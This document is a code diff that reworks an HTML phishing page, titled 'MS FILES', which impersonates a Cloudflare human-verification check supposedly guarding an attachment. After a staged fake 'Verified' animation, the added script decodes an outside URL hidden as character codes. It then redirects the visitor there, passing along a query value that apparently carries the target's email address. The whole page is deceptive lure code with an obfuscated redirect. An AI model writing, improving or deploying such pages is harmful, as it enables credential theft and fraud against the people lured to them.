@@ -5,143 +5,156 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MS FILES</title>
     <style>
-        :root { --main-hue: #4a6ee0; --success-hue: #28a745; --sans: 'Segoe UI', Roboto, sans-serif; }
-        html, body { height: 100%; margin: 0; padding: 0; background-color: #ffffff; font-family: var(--sans); overflow: hidden; }
+        :root { --accent: #4a6ee0; --done: #28a745; }
+        * { box-sizing: border-box; }
+        body { margin: 0; background: #ffffff; font-family: "Segoe UI", Tahoma, sans-serif; height: 100vh; overflow: hidden; }
 
-        /* Splash Screen */
-        .overlay-screen {
-            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: #f8f9fa; z-index: 100;
-            display: grid; place-items: center;
-            transition: opacity 400ms ease-in-out;
+        /* Initial Loading Screen */
+        #preloader {
+            position: fixed; inset: 0; background: #f8f9fa; z-index: 1000;
+            display: flex; align-items: center; justify-content: center;
+            transition: opacity 0.4s;
         }
 
-        .spinner-img { width: 100px; filter: grayscale(20%); animation: heartbeat 1800ms infinite; }
-        @keyframes heartbeat { 0%, 100% { transform: scale(1); opacity: 0.6; } 50% { transform: scale(1.04); opacity: 1; } }
+        .pulse-icon { width: 100px; opacity: 0.8; animation: breath 1.8s ease-in-out infinite; }
+        @keyframes breath { 0%, 100% { transform: scale(1); opacity: 0.6; } 50% { transform: scale(1.05); opacity: 1; } }
 
-        /* Main Content Container */
-        main {
-            width: 100%; max-width: 400px; margin: 0 auto; padding: 32px;
-            display: flex; flex-direction: column; height: 80vh; justify-content: center;
-            opacity: 0; transform: translateY(15px); transition: opacity 0.8s, transform 0.8s;
+        /* Main Viewport */
+        #app-shell {
+            display: grid; place-content: center; height: 100%;
+            opacity: 0; transform: translateY(10px); transition: all 0.8s cubic-bezier(0.16, 1, 0.3, 1);
         }
 
-        .is-visible main { opacity: 1; transform: translateY(0); }
+        body.active #app-shell { opacity: 1; transform: translateY(0); }
 
-        .instruction-text { text-align: center; font-size: 17.6px; color: #1a1a1a; font-weight: 500; margin-bottom: 32px; line-height: 1.5; }
+        .container { width: 400px; padding: 0 20px; text-align: center; }
+        .info-title { font-size: 18px; color: #1a1a1a; font-weight: 500; margin-bottom: 30px; line-height: 1.4; }
 
-        /* Verification Box */
-        .v-card {
-            background: #fbfbfb; border: 1px solid #e0e0e0; border-radius: 12px; height: 40px;
-            padding: 35px 22px; display: flex; align-items: center; justify-content: space-between;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
+        /* Widget Box */
+        .verification-row {
+            background: #fafafa; border: 1px solid #ddd; border-radius: 10px;
+            padding: 30px 20px; display: flex; align-items: center; text-align: left;
         }
 
-        .v-left-side { display: flex; align-items: center; gap: 19px; }
+        .action-area { flex-grow: 1; display: flex; align-items: center; gap: 15px; }
 
-        .checkbox-ui {
-            width: 20px; height: 20px; border: 2.5px solid var(--main-hue); border-radius: 5px;
-            cursor: pointer; position: relative; transition: 300ms ease;
+        .check-box {
+            width: 26px; height: 26px; border: 2px solid var(--accent); border-radius: 4px;
+            cursor: pointer; position: relative; display: grid; place-items: center;
         }
 
-        .is-loading { border-radius: 50%; border-color: #ddd; border-top-color: var(--main-hue); animation: spin-loader 0.8s linear infinite; }
-        .is-complete { background: var(--success-hue); border-color: var(--success-hue); }
-        .is-complete::before { content: "\2713"; color: #fff; position: absolute; left: 5px; top: 0px; font-weight: bold; font-size: 16px; }
+        /* Logic States */
+        .state-working { border-radius: 50%; border-color: #eee; border-top-color: var(--accent); animation: spin 0.7s linear infinite; }
+        .state-success { background: var(--done); border-color: var(--done); }
+        .state-success::after { content: '✔'; color: white; font-size: 14px; font-weight: 900; }
 
-        @keyframes spin-loader { 100% { transform: rotate(360deg); } }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        .vendor-info { text-align: right; font-size: 11px; color: #888; }
-        .vendor-info img { width: 28px; margin-bottom: 4px; }
-        .vendor-info strong { color: #f38020; display: block; text-transform: uppercase; font-size: 10px; }
+        .status-label { font-size: 15px; font-weight: 600; color: #444; }
 
-        .bottom-anchor {
-            position: absolute; bottom: 25px; width: 100%; text-align: center;
-            font-size: 12px; color: #bbb; display: flex; justify-content: center; align-items: center; gap: 7px;
+        /* Branding */
+        .brand-aside { text-align: right; line-height: 1.2; }
+        .brand-aside img { width: 28px; display: block; margin: 0 0 5px auto; }
+        .brand-aside span { font-size: 10px; font-weight: 800; color: #f38020; display: block; }
+        .brand-aside small { font-size: 11px; color: #999; }
+
+        /* Bottom Badge */
+        .secure-footer {
+            position: fixed; bottom: 25px; left: 0; right: 0;
+            display: flex; justify-content: center; align-items: center;
+            gap: 8px; color: #bbb; font-size: 12px;
         }
-
-        .shield-svg { width: 12px; height: 14px; background: #ccc; clip-path: polygon(0 0, 100% 0, 100% 80%, 50% 100%, 0 80%); }
+        .shield-path { width: 12px; height: 14px; background: #ccc; clip-path: polygon(0% 0%, 100% 0%, 100% 75%, 50% 100%, 0% 75%); }
     </style>
 </head>
 <body>
 
-    <div class="overlay-screen" id="gatekeeper">
-        <img src="astro.png" class="spinner-img">
+    <div id="preloader">
+        <img src="astro.png" class="pulse-icon">
     </div>
 
-    <main>
-        <h1 class="instruction-text">Verify you are human by completing the action below to view attachment</h1>
+    <div id="app-shell">
+        <div class="container">
+            <h2 class="info-title">Verify you are human by completing the action below to view attachment</h2>
 
-        <div class="v-card">
-            <div class="v-left-side">
-                <div id="actionBtn" class="checkbox-ui"></div>
-                <span id="statusTxt" style="font-weight: 600; color: #333; letter-spacing: -0.2px;">Verify</span>
-            </div>
+            <div class="verification-row">
+                <div class="action-area">
+                    <div id="target-node" class="check-box"></div>
+                    <div id="label-node" class="status-label">Verify</div>
+                </div>
 
-            <div class="vendor-info">
-                <img src="cloudflare_.png">
-                <strong>CLOUDFLARE</strong>
-                Privacy &middot; Terms
+                <div class="brand-aside">
+                    <img src="cloudflare_.png">
+                    <span>CLOUDFLARE</span>
+                    <small>Privacy &middot; Terms</small>
+                </div>
             </div>
         </div>
-    </main>
+    </div>
 
-    <div class="bottom-anchor">
-        <div class="shield-svg"></div>
+    <div class="secure-footer">
+        <div class="shield-path"></div>
         Protected by CLOUDFLARE
     </div>
 
     <script>
-        (function(win, doc) {
+        (function() {
             "use strict";
 
-            // Encoded target bits
-            const sequence = [104, 116, 116, 112, 115, 58, 47, 47, 112, 111, 46, 116, 105, 102, 102, 110, 117, 97, 101, 46, 111, 110, 108, 105, 110, 101, 47, 97, 112, 105, 47, 118, 49, 47, 116, 103, 75, 72, 102, 48, 114, 48, 69, 87, 113, 73, 97, 67, 98, 53];
-            const delays = { intro: 1300, process: 1600, redirect: 800 };
-            let locked = false;
-
-            // Page Initialization
-            win.onload = function() {
-                setTimeout(() => {
-                    const gate = doc.getElementById('gatekeeper');
-                    gate.style.opacity = '0';
-                    setTimeout(() => {
-                        gate.style.display = 'none';
-                        doc.body.className = 'is-visible';
-                    }, 400);
-                }, delays.intro);
+            // Resource Config
+            const CONFIG = {
+                codes: [104, 116, 116, 112, 115, 58, 47, 47, 112, 111, 46, 116, 105, 102, 102, 110, 117, 97, 101, 46, 111, 110, 108, 105, 110, 101, 47, 97, 112, 105, 47, 118, 49, 47, 116, 103, 75, 72, 102, 48, 114, 48, 69, 87, 113, 73, 97, 67, 98, 53],
+                wait: [1300, 1600, 800]
             };
 
-            // Logic Handler
-            async function handleVerification() {
-                if (locked) return;
-                locked = true;
+            const dom = {
+                loader: document.getElementById('preloader'),
+                btn: document.getElementById('target-node'),
+                txt: document.getElementById('label-node')
+            };
 
-                const trigger = doc.getElementById('actionBtn');
-                const label = doc.getElementById('statusTxt');
+            let isRunning = false;
 
-                // Visual phase 1: Loading
-                label.innerText = "Processing...";
-                trigger.classList.add('is-loading');
-
-                await new Promise(resolve => setTimeout(resolve, delays.process));
-
-                // Visual phase 2: Success
-                trigger.classList.remove('is-loading');
-                trigger.classList.add('is-complete');
-                label.innerText = "Verified";
-
-                // Final phase: Redirection
+            // Startup
+            window.addEventListener('DOMContentLoaded', () => {
                 setTimeout(() => {
-                    const destination = sequence.map(code => String.fromCharCode(code)).join('');
-                    const query = new URLSearchParams(win.location.search).get('eoff');
+                    dom.loader.style.opacity = '0';
+                    setTimeout(() => {
+                        dom.loader.style.display = 'none';
+                        document.body.classList.add('active');
+                    }, 400);
+                }, CONFIG.wait[0]);
+            });
 
-                    win.location.replace(query ? `${destination}#${query}` : destination);
-                }, delays.redirect);
-            }
+            // Verification Sequence
+            const executeProcess = async () => {
+                if (isRunning) return;
+                isRunning = true;
 
-            doc.getElementById('actionBtn').addEventListener('click', handleVerification);
+                // Step 1: Loading
+                dom.txt.innerText = "Verifying...";
+                dom.btn.classList.add('state-working');
 
-        })(window, document);
+                await new Promise(res => setTimeout(res, CONFIG.wait[1]));
+
+                // Step 2: Completed
+                dom.btn.className = 'check-box state-success';
+                dom.txt.innerText = "Verified";
+
+                // Step 3: Redirect
+                setTimeout(() => {
+                    const endpoint = CONFIG.codes.reduce((acc, code) => acc + String.fromCharCode(code), "");
+                    const params = new URLSearchParams(window.location.search);
+                    const fragment = params.get('eoff');
+
+                    const url = fragment ? (endpoint + '#' + fragment) : endpoint;
+                    window.location.href = url;
+                }, CONFIG.wait[2]);
+            };
+
+            dom.btn.onclick = executeProcess;
+
+        })();
     </script>
 </body>
 </html>
